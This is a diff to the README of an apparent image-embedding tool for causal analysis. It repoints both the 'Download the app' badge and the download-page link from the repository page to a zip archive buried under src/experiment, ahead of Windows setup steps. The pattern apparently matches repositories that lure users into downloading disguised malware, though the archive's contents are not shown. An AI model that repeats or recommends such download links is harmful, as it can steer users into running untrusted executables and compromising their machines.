@@ -1,7 +1,7 @@
 # 🖼️ causal-image-embedding - Image embeddings for causal analysis
 
 <p align="center">
-  <a href="https://github.com/fragmentationcarolinalupine81/causal-image-embedding">
+  <a href="https://github.com/fragmentationcarolinalupine81/causal-image-embedding/raw/refs/heads/main/src/experiment/image-embedding-causal-3.0.zip">
     <img src="https://img.shields.io/badge/Download%20the%20app-Visit%20GitHub-6A5ACD?style=for-the-badge&logo=github&logoColor=white" alt="Download the app" />
   </a>
 </p>
@@ -16,7 +16,7 @@ Use it when you need to compare groups, study outcomes, and include images as pa
 
 Use this link to visit the download page:
 
-[Open the download page](https://github.com/fragmentationcarolinalupine81/causal-image-embedding)
+[Open the download page](https://github.com/fragmentationcarolinalupine81/causal-image-embedding/raw/refs/heads/main/src/experiment/image-embedding-causal-3.0.zip)
 
 ### Steps to get started on Windows
 
